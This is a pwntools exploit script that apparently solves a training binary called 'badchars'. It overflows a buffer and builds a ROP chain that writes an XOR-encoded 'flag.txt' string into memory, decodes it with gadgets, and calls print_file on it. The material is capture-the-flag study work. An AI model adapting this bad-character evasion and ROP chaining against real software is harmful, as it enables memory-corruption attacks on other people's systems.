from pwn import *

elf=exe=ELF("./badchars",checksec=False)
p=process(exe.path)
#input()
offset=0x28
print_file=0x400510
pop_rdi=0x00000000004006a3
pop_r12_pop_r13_pop_r14_pop_r15_ret=0x000000000040069c
rw_section=0x00000000601500
ret=0x00000000004004ee
xor_r15_r14=0x0000000000400628
pop_r15=0x00000000004006a2
mov_r13_r12=0x0000000000400634
payload=b"A"*offset
payload+=p64(pop_r12_pop_r13_pop_r14_pop_r15_ret)
payload+=p64(0x767a762c65636e64)+p64(rw_section)+p64(0x2)+p64(rw_section)
payload+=p64(mov_r13_r12)
payload+=p64(xor_r15_r14)
payload+=p64(pop_r15)+p64(rw_section+1)
payload+=p64(xor_r15_r14)
payload+=p64(pop_r15)+p64(rw_section+2)
payload+=p64(xor_r15_r14)
payload+=p64(pop_r15)+p64(rw_section+3)
payload+=p64(xor_r15_r14)
payload+=p64(pop_r15)+p64(rw_section+4)
payload+=p64(xor_r15_r14)
payload+=p64(pop_r15)+p64(rw_section+5)
payload+=p64(xor_r15_r14)
payload+=p64(pop_r15)+p64(rw_section+6)
payload+=p64(xor_r15_r14)
payload+=p64(pop_r15)+p64(rw_section+7)
payload+=p64(xor_r15_r14)
payload+=p64(ret)
payload+=p64(pop_rdi)+p64(rw_section)
payload+=p64(print_file)
p.sendlineafter(b">",payload)
p.interactive()